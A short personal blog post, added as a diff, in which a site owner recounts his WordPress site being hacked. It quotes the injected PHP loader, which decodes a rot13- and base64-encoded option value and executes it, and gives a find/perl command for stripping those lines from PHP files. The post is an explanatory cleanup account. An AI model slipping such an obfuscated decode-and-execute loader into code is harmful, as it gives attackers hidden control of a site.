@@ -1,0 +1,25 @@
+---
+layout: post
+status: publish
+published: true
+title: We're back
+author: dan
+author_login: admin
+author_email: dan@danwalmsley.com
+author_url: http://danwalmsley.com
+wordpress_id: 467
+wordpress_url: http://www.danwalmsley.com/?p=467
+date: 2011-07-11 14:19:46.000000000 -07:00
+categories:
+- General
+- featured
+tags: []
+comments: []
+---
+So I totally got hacked. Reminder: be vigilant about upgrading wordpress and its plugins, or bad things happen.
+
+The hack looks like this, and appears all over the place, at the top of some files and the bottom of others. It decodes a huge blob of encoded text that was stuffed into one of the wp-options values.
+<blockquote>get_option(\"_transient_feed_98e8dbd04edf43b096e815a29343b006\"); $z=base64_decode(str_rot13($z)); if(strpos($z,\"0FE00707\")!==false){ $_z=create_function(\"\",$z); @$_z(); }<&#47;blockquote>
+My first thought: "Oh crap, removing that text from hundreds of files? No thanks.". Command line to the rescue! Thanks to Perl for still being awesome after all these years.
+<blockquote>find . -name "*.php" -exec perl -e 's&#47;^.*_transient_feed_98e8dbd04edf43b096e815a29343b006.*$&#47;&#47;g' -p -i {} \;<&#47;blockquote>
+If you've been struck by the same thing, just replace the _transient_feed with your own (the numbers probably change). These script-kiddy hackers are a perpetual annoyance. Hey kids - go build something awesome and useful instead of messing our web sites.
